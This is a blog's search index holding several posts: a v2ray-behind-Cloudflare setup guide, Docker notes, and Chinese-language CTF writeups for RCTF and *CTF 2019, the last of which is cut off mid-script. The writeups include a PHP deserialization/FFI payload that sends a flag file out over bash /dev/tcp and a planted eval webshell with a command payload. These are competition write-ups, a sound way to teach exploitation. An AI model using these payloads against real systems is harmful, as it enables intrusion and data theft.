<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[Escaping]]></title>
      <url>/blog/public/2019/06/25/Escaping</url>
      <content type="html"><![CDATA[<p>Recently, massive of VPS servers on <code>***</code> have been banned by <code>***</code>, so here is my experience (only a few steps) saving my banned servers back with <code>Cloudflare</code>.</p>
<h2 id="Banned-Server"><a href="#Banned-Server" class="headerlink" title="Banned Server"></a>Banned Server</h2><p>OS of my server is <code>CentOS 7</code>, and I’m using <code>nginx</code> web server on it, and I also want my server to support PHP.</p>
<ol>
<li><p>Install <code>nginx</code>. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/yum.repos.d/nginx.repo</span><br><span class="line"></span><br><span class="line"># cat /etc/yum.repos.d/nginx.repo</span><br><span class="line">[nginx]</span><br><span class="line">name=nginx repo</span><br><span class="line">baseurl=http://nginx.org/packages/mainline/centos/7/$basearch/</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line"># yum update</span><br><span class="line"># yum install -y nginx</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p>Configure <code>nginx</code> to support <code>PHP</code>. (I already have PHP installed).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"># yum install php-fpm</span><br><span class="line"># service php-fpm start</span><br><span class="line"># systemctl enable php-fpm</span><br><span class="line"># cp /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/default.conf.bak</span><br><span class="line"># vi /etc/nginx/conf.d/default.conf</span><br><span class="line"># cat /etc/nginx/conf.d/default.con</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  listen       80;</span><br><span class="line">  server_name  localhost;</span><br><span class="line"></span><br><span class="line">  charset utf-8;</span><br><span class="line">  #access_log  /var/log/nginx/host.access.log  main;</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">      root   /usr/share/nginx/html;</span><br><span class="line">      index  index.html index.htm index.php;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">  # redirect server error pages to the static page /50x.html</span><br><span class="line">  #</span><br><span class="line">  error_page   500 502 503 504  /50x.html;</span><br><span class="line">  location = /50x.html &#123;</span><br><span class="line">      root   /usr/share/nginx/html;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">  #</span><br><span class="line">  #location ~ \.php$ &#123;</span><br><span class="line">  #    proxy_pass   http://127.0.0.1;</span><br><span class="line">  #&#125;</span><br><span class="line"></span><br><span class="line">  # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">  #</span><br><span class="line">  location ~ \.php$ &#123;</span><br><span class="line">      root           /usr/share/nginx/html;</span><br><span class="line">      fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">      fastcgi_index  index.php;</span><br><span class="line">      fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">      include        fastcgi_params;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class="line">  # concurs with nginx&apos;s one</span><br><span class="line">  #</span><br><span class="line">  #location ~ /\.ht &#123;</span><br><span class="line">  #    deny  all;</span><br><span class="line">  #&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>generate certificate</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># yum install -y nc</span><br><span class="line"># yum install -y socat</span><br><span class="line"># curl  https://get.acme.sh | sh</span><br><span class="line"># service nginx stop</span><br><span class="line"># ~/.acme.sh/acme.sh --issue -d domain --standalone -k ec-256</span><br><span class="line"># ~/.acme.sh/acme.sh --installcert -d domain --fullchainpath /path/path/cert.crt --keypath /path/path/key --ecc</span><br></pre></td></tr></table></figure>
</li>
<li><p>install v2ray &amp; configure it</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br></pre></td></tr></table></figure>
<p>Configuration is as follows:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;inbounds&quot;: [&#123;</span><br><span class="line">  &quot;port&quot;: 11111,</span><br><span class="line">  &quot;listen&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">  &quot;protocol&quot;: &quot;vmess&quot;,</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;clients&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;id&quot;: &quot;******-****-****-****-***********&quot;,</span><br><span class="line">        &quot;level&quot;: 1,</span><br><span class="line">        &quot;alterId&quot;: 64</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;streamSettings&quot;: &#123;</span><br><span class="line">      &quot;network&quot;: &quot;ws&quot;,</span><br><span class="line">      &quot;wsSettings&quot;: &#123;</span><br><span class="line">      &quot;path&quot;: &quot;/ws&quot;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;],</span><br><span class="line">&quot;outbounds&quot;: [&#123;</span><br><span class="line">  &quot;protocol&quot;: &quot;freedom&quot;,</span><br><span class="line">  &quot;settings&quot;: &#123;&#125;</span><br><span class="line">&#125;,&#123;</span><br><span class="line">  &quot;protocol&quot;: &quot;blackhole&quot;,</span><br><span class="line">  &quot;settings&quot;: &#123;&#125;,</span><br><span class="line">  &quot;tag&quot;: &quot;blocked&quot;</span><br><span class="line">&#125;],</span><br><span class="line">&quot;routing&quot;: &#123;</span><br><span class="line">  &quot;rules&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;type&quot;: &quot;field&quot;,</span><br><span class="line">      &quot;ip&quot;: [&quot;geoip:private&quot;],</span><br><span class="line">      &quot;outboundTag&quot;: &quot;blocked&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p>configure ssl for nginx</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen  443 ssl;</span><br><span class="line">ssl on;</span><br><span class="line">ssl_certificate       /etc/v2ray/v2ray.crt;</span><br><span class="line">ssl_certificate_key   /etc/v2ray/v2ray.key;   //这俩证书路径改成你的</span><br><span class="line">ssl_protocols         TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">ssl_ciphers           HIGH:!aNULL:!MD5;</span><br><span class="line">server_name           mydomain.me;  //域名改成你的</span><br><span class="line">      location /ws &#123; # 与 V2Ray 配置中的 path 保持一致</span><br><span class="line">      proxy_redirect off;</span><br><span class="line">      proxy_pass http://127.0.0.1:12345;#假设WebSocket监听在环回地址的12345端口上</span><br><span class="line">      proxy_http_version 1.1;</span><br><span class="line">      proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">      proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">      proxy_set_header Host $http_host;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="Cloudflare"><a href="#Cloudflare" class="headerlink" title="Cloudflare"></a>Cloudflare</h2><p><a href="https://www.cloudflare.com" target="_blank" rel="noopener">Cloudflare</a> supports a series of functions to maintain a site. We need it to provide <code>CDN</code> service for our banned servers. With <code>CDN</code> deployed, when visiting domain name of our banned servers, the visitor will first get the IP address of the CDN server, and CDN server do the rest stuffs to communicate with our banned servers, which guarantees that a certain Firewall will never know what site you are visiting.</p>
<p>Here are a fill steps set up your Cloudflare:</p>
<ol>
<li>Sign up and sign in Cloudflare.  </li>
<li>Add your site. (Here you have to register a domain name for your server.)  </li>
<li>Substitue DNS server of your domain name with DNS Server of Cloudflare.</li>
<li>Resolve a domain name to your server. For example, if you want to visit IP <code>11.11.11.11</code> when you tpye domain name <code>test.example.com</code> in your browser, you should set a record of type <code>A</code> which contains key <code>test</code> and IP <code>11.11.11.11</code> both in cloudflare and your domain name service provider.</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> None </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[docker notes]]></title>
      <url>/blog/public/2019/05/22/docker-notes</url>
      <content type="html"><![CDATA[<p>这里记录自己Docker上用过的一些知识。  </p>
<blockquote>
<p>主要参考：<a href="https://docs.docker.com/" target="_blank" rel="noopener">https://docs.docker.com/</a></p>
</blockquote>
<hr>
<h2 id="0x00-关于Docker"><a href="#0x00-关于Docker" class="headerlink" title="0x00 关于Docker"></a>0x00 关于Docker</h2><p>概念：容器、镜像  </p>
<blockquote>
<p>A container is launched by running an image. An image is an executable package that includes everything needed to run an application–the code, a runtime, libraries, environment variables, and configuration files.</p>
<p>A container is a runtime instance of an image–what the image becomes in memory when executed (that is, an image with state, or a user process). You can see a list of your running containers with the command, docker ps, just as you would in Linux.</p>
</blockquote>
<p><strong>镜像</strong>是包含运行一个应用所有需要的东西（如代码、运行时、库、环境变量以及配置文件）的包。<br>而<strong>容器</strong>是通过运行一个镜像而创建的，相当于一个镜像的运行时实例（即镜像在内存里的运行时状态或者用户进程）。  </p>
<p>容器和虚拟机：  </p>
<blockquote>
<p>A container runs natively on Linux and shares the kernel of the host machine with other containers. It runs a discrete process, taking no more memory than any other executable, making it lightweight.</p>
<p>By contrast, a virtual machine (VM) runs a full-blown “guest” operating system with virtual access to host resources through a hypervisor. In general, VMs provide an environment with more resources than most applications need.</p>
</blockquote>
<p>容器运行在宿主机上，并且容器之间共享宿主机内核。容器更加轻量，它运行一个单独的进程，除了自己的应用之外不会因为其他可执行程序而占用多余内存。<br>相比之下，虚拟机运行一个完整的客户操作系统，并且在虚拟机监视器的管理下以虚拟的方式获取宿主机资源。大体上说，在虚拟机上运行应用会要求许多本应用不需要的资源。</p>
<p><img src="../../../../images/dockerVSvm.png" alt=""></p>
<hr>
<h2 id="0x01-从dockerfile创建镜像"><a href="#0x01-从dockerfile创建镜像" class="headerlink" title="0x01 从dockerfile创建镜像"></a>0x01 从dockerfile创建镜像</h2><p>最近需要从一个<code>dockerfile</code>部署一个题目环境，这里参考<a href="https://docs.docker.com/get-started/part2/" target="_blank" rel="noopener">Get Started, Part 2: Containers</a>，使用命令如下：  </p>
<pre><code>docker build --tag=tagname .
</code></pre><p>会利用当前目录下的<code>dockerfile</code>创建<code>docker image</code>。</p>
<hr>
<p>0x02 用过的一些命令</p>
<ol>
<li>docker info: 查看docker信息。  </li>
<li>docker image ls: 列举本地安装的docker镜像。  </li>
<li>docker container ls –all: 列举所有容器。  </li>
<li>docker run image-tag: 运行一个镜像。</li>
<li>docker run -p localport:containerport image-tag: 运行容器，并映射端口。  </li>
<li>docker run -p localport:containerport image-tag: detach模式运行，即后台运行。  </li>
</ol>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
            <category> Docker </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Docker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[rctf 2019 writeup]]></title>
      <url>/blog/public/2019/05/22/rctf-2019-writeup</url>
      <content type="html"><![CDATA[<h1 id="RCTF-2019-Writeup"><a href="#RCTF-2019-Writeup" class="headerlink" title="RCTF 2019 - Writeup"></a>RCTF 2019 - Writeup</h1><h2 id="0x00-Web-nextphp"><a href="#0x00-Web-nextphp" class="headerlink" title="0x00 Web - nextphp"></a>0x00 Web - nextphp</h2><p>通过题目给出代码可以获取<code>phpinfo</code>。<code>disable_functions</code>中禁用函数很全:(，没有imagick组件:(，<code>open_basedir</code>限制为web目录。经过反复查看发现了<code>opcache</code>配置中有<code>opcache.preload = /var/www/html/preload.php</code>。另外，通过<code>glob</code>可以列举目录（可以绕过<code>open_basedir</code>限制，参考<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">博客</a>），得到服务器根目录存在文件<code>flag</code>，web目录下很干净，只有<code>index.php</code>和<code>preload.php</code>两个文件。题目突破口很大可能性存在于<code>preload.php</code>了。通过主页的eval可以读取<code>preload.php</code>的内容如下：  </p>
<pre><code class="PHP"><span class="meta">&lt;?php</span>
<span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>{
    <span class="keyword">protected</span> $data = [
        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,
        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,
        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span>
    ];

    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>{
        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);
    }

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>{
        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;
    }

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>{
        array_merge(<span class="keyword">$this</span>-&gt;data, $data);
        <span class="keyword">$this</span>-&gt;run();
    }

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>{
        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);
    }

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>{
        <span class="keyword">$this</span>-&gt;data = unserialize($payload);
        <span class="keyword">$this</span>-&gt;run();
    }

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>{
        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];
    }

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>{
        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);
    }

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>{
        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);
    }
}
</code></pre>
<p>很像是一个反序列化的入口，可以通过<code>run</code>函数和参数执行命令，但是相关的os调用命令都已经被封死。又注意到php版本为<code>PHP 7.4 - dev</code>，总觉得新版本+dev标志会有些猫腻在。<br>关于<code>preload</code>可以参考以下RFC文档：  </p>
<ol>
<li><a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">PHP RFC: Preloading</a></li>
<li><a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">PHP RFC: FFI - Foreign function Interface</a></li>
<li><a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">PHP RFC: New custom object serialization mechanism</a>  </li>
</ol>
<p>文档一表示可以通过<code>php.ini</code>中的<code>opcache.preload</code>来指定一个文件进行预加载（preload），被预加载的文件会被整个执行或者加载其他的文件。<strong>也就是说我们可以通过<code>preload.php</code>执行命令，而通过<code>serialize</code>函数我们可以触发其执行。</strong>但是相关的系统调用都已经被封死了，这时候需要借用文档二中的<code>FFI</code>。通过FFI，人们可以方便的调用C函数或者处理C结构，相关例子可以再RFC文档中查看。文档三中定义了一种新的序列化机制。</p>
<p>根据以上文档构造payload如下：  </p>
<pre><code class="PHP"><span class="meta">&lt;?php</span>
$a = <span class="keyword">new</span> A();
$ss = serialize($a);
<span class="comment">#$ss = 'C:1:"A":61:{a:3:{s:3:"ret";N;s:4:"func";s:7:"print_r";s:3:"arg";s:1:"1";}}';</span>
<span class="keyword">echo</span> $ss;
<span class="meta">?&gt;</span>

?a=$emm=unserialize(%<span class="number">27</span>C:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">95</span>:{a:<span class="number">3</span>:{s:<span class="number">3</span>:<span class="string">"ret"</span>;N;s:<span class="number">4</span>:<span class="string">"func"</span>;s:<span class="number">9</span>:<span class="string">"FFI::cdef"</span>;s:<span class="number">3</span>:<span class="string">"arg"</span>;s:<span class="number">32</span>:<span class="string">"int%20system(const%20char%20*command);"</span>;}}%<span class="number">27</span>);$emm-&gt;ret-&gt;system(%<span class="number">27</span>bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">"cat%20/flag%20&gt;%20/dev/tcp/host/port"</span>%<span class="number">27</span>);
</code></pre>
<h2 id="0x01-Web-jail"><a href="#0x01-Web-jail" class="headerlink" title="0x01 Web - jail"></a>0x01 Web - jail</h2><h2 id="0x02-Web-password"><a href="#0x02-Web-password" class="headerlink" title="0x02 Web - password"></a>0x02 Web - password</h2><h2 id="0x03-Web-calcalcalc"><a href="#0x03-Web-calcalcalc" class="headerlink" title="0x03 Web - calcalcalc"></a>0x03 Web - calcalcalc</h2><h2 id="0x04-Web-rBlog"><a href="#0x04-Web-rBlog" class="headerlink" title="0x04 Web - rBlog"></a>0x04 Web - rBlog</h2><h2 id="0x05-Web-ez4cr"><a href="#0x05-Web-ez4cr" class="headerlink" title="0x05 Web - ez4cr"></a>0x05 Web - ez4cr</h2>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
            <category> 赛后总结 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 赛后总结 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[starctf 2019 writeup]]></title>
      <url>/blog/public/2019/04/29/starctf%202019%20writeup%20Zer0-D4y</url>
      <content type="html"><![CDATA[<h1 id="CTF-2019-Writeup"><a href="#CTF-2019-Writeup" class="headerlink" title="*CTF 2019 - Writeup"></a>*CTF 2019 - Writeup</h1><p>author: Ainassine<br>team: Zer0-D4y<br>official source code: <a href="https://github.com/sixstars/starctf2019" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019</a></p>
<h2 id="0x00-Web-mywebsql"><a href="#0x00-Web-mywebsql" class="headerlink" title="0x00 Web - mywebsql"></a>0x00 Web - mywebsql</h2><p>点开题目url，是一个<a href="https://github.com/Samnan/MyWebSQL" target="_blank" rel="noopener">mywebsql</a>的管理登录界面，条件反射测试用户名密码admin:admin，登录成功。登录后是一个数据库管理界面。可以进行建表操作。关键是有数据库备份功能。通过github可以得到mywebsql的目录结构，经过验证，其中的backups目录我们确实可以访问，测试备份数据库表，可以指定备份文件名称，在backups目录下可以访问到。<br><strong>step 1</strong><br>构造数据表内容并通过备份生成一句话木马。数据表内容<code>*/&lt;?php eval($_GET[cmd]);?&gt;/*</code>，备份文件名设置为<code>test.php</code>。备份之后访问<code>http://targeturl/backups/test.php?cmd=echo phpinfo();</code>看到<code>phpinfo()</code>打印信息后确认第一步完成。<br><strong>step 2</strong><br>寻找flag位置。通过<code>?cmd=echo system(&#39;ls ..&#39;);</code>层级查看每个目录的内容，最终确定在系统根目录下存在文件<code>flag</code>和<code>readflag</code>。其中<code>flag</code>我们没有读权限，而我们对<code>readflag</code>有执行权限，尝试执行<code>readflag</code>得到输出，其中给出了一个算式，要求我们给出这个算式的结果才能读取flag。<br><strong>step 3</strong><br>读取flag。这里要求我们通过php与服务器上的可执行文件进行读、写的互动操作，通过查询，决定使用php的<a href="https://php.net/manual/zh/function.proc-open.php" target="_blank" rel="noopener">proc_open()</a>函数。最终构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://targeturl/backups/123456.php?cmd=$d=array(0=%3Earray(%22pipe%22,%22r%22),1=%3Earray(%22pipe%22,%22w%22));$fp=proc_open(%22../../../../readflag%22,$d,$pipes);$a=fgets($pipes[1]);$x=fgets($pipes[1]);$ret=eval(%22return%20$x;%22);echo%20$ret.%22%3CBR%3E%22;$emm=fwrite($pipes[0],strval($ret));echo%20$emm.%22%3CBR%3E%22;fclose($pipes[0]);$c=fgets($pipes[1]);$e=fgets($pipes[1]);echo%20$c.%20$e.%22%3CBR%3E%22;fclose($pipes[1]);proc_close($fp);</span><br></pre></td></tr></table></figure></p>
<p>成功getflag。  </p>
<h2 id="0x01-Misc-Checkin"><a href="#0x01-Misc-Checkin" class="headerlink" title="0x01 Misc - Checkin"></a>0x01 Misc - Checkin</h2><p><a href="https://webchat.freenode.net/" target="_blank" rel="noopener">Freenode</a> 输入频道号 <code>#*ctf2019</code>，在频道顶部就是flag。  </p>
<h2 id="0x02-Misc-She"><a href="#0x02-Misc-She" class="headerlink" title="0x02 Misc - She"></a>0x02 Misc - She</h2><p>下载下来是个游戏，可以利用<code>rpg maker xp</code>直接进行编辑。在游戏左下房子我们需要打败一只“野鸡？”进入到后面的关卡，这里比较麻烦，我们修改进入左下房子的事件，可以直接进入一个地牢一样的地方，地牢总共有三个房间，每个房间有三个隔间关着三只箱子。打开隔间的门需要遵从一定的顺序，经过分析，打开的顺序（按照里面箱子的号码排序）为<code>3-&gt;7-&gt;1-&gt;2-&gt;6-&gt;9</code>，打开之后可以进入最后的房间。在最后的房间，镜子会告诉你把前面看到的箱子里的数字md5编码之后就是flag。但是之前的序列编码得到的flag不正确。需要按照房间的顺序重新排序。最终数字序列似乎为<code>312679</code>（记不清了），MD5编码后放到<code>*CTF{}</code>里面提交即可。</p>
<h2 id="0x03-Misc-babyflash"><a href="#0x03-Misc-babyflash" class="headerlink" title="0x03 Misc - babyflash"></a>0x03 Misc - babyflash</h2><p>下载之后得到一个swf文件，解压获得里面的图片和音频。<br><strong>对于图片</strong><br>按照图片顺序，黑为0白为1，拼凑出0-1序列如下(脚本找不到了)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000011001110000000011111011000110111110010001010100110100010010001011011010100010010001011010010100010011111011001110111110000000010101010000000111111110101011111111000100000100000111011001001100100010000100010010000110010000100101101110011111111100000101011111011100111111111110100011001100000000010100011001010011111010010111011101010001010100100111110010001011010010001111010001010010001001110011111010100011101101000000010010011110100</span><br></pre></td></tr></table></figure></p>
<p>利用脚本将其拼成二维码，扫出一半flag为<code>*ctf{half_flag_&amp;</code>，脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">import math</span><br><span class="line">length = int(math.sqrt(441))</span><br><span class="line">im = Image.new(&apos;RGB&apos;, (length * 5, length * 5))</span><br><span class="line"></span><br><span class="line">data = &quot;000000011001110000000011111011000110111110010001010100110100010010001011011010100010010001011010010100010011111011001110111110000000010101010000000111111110101011111111000100000100000111011001001100100010000100010010000110010000100101101110011111111100000101011111011100111111111110100011001100000000010100011001010011111010010111011101010001010100100111110010001011010010001111010001010010001001110011111010100011101101000000010010011110100&quot;</span><br><span class="line"></span><br><span class="line">for x in range(length):</span><br><span class="line">    for y in range(length):</span><br><span class="line">        if data[x * length + y] == &apos;0&apos;:</span><br><span class="line">            for ii in range(x * 5, x * 5 + 5):</span><br><span class="line">                for jj in range(y * 5, y * 5 + 5):</span><br><span class="line">                    im.putpixel([ii, jj], (0,0,0))</span><br><span class="line">        else:</span><br><span class="line">            for ii in range(x * 5, x * 5 + 5):</span><br><span class="line">                for jj in range(y * 5, y * 5 + 5):</span><br><span class="line">                    im.putpixel([ii, jj], (255,255,255))</span><br><span class="line"></span><br><span class="line">im.save(&apos;out.png&apos;)</span><br></pre></td></tr></table></figure></p>
<p><strong>对于音频</strong><br>使用<code>audacity</code>转为频谱模式，可以看到<code>&amp;_the_rest}</code>字样。<br>最终 flag: *ctf{half<em>flag</em>&amp;&amp;_the_rest}</p>
<h2 id="0x04-Misc-otaku"><a href="#0x04-Misc-otaku" class="headerlink" title="0x04 Misc - otaku"></a>0x04 Misc - otaku</h2><p>拿到文件，是一个word和一个压缩包，尝试解压显示里面有一个<code>flag.png</code>和一个<code>last words.txt</code>，其中<code>last words.txt</code>显示为423字节（好像是这么长）。打开word文件，通过格式刷，发现了隐藏文字，其长度也是423字节，故联想到已知明文攻击。破解得到密码为<code>My_waifu</code>。<br>拿到图片后使用<code>stageSolve</code>，在<code>Extract data</code>工具中设置<code>R=0,G=0,B=0</code>，选择<code>Extract By Row</code>和<code>LSB First</code>，在提取信息的顶部可以看到flag。</p>
<h2 id="0x05-Crypto-babyprng-amp-babyprng2"><a href="#0x05-Crypto-babyprng-amp-babyprng2" class="headerlink" title="0x05 Crypto - babyprng &amp; babyprng2"></a>0x05 Crypto - babyprng &amp; babyprng2</h2><p>第一题解题脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brust_sha</span><span class="params">(known_part, 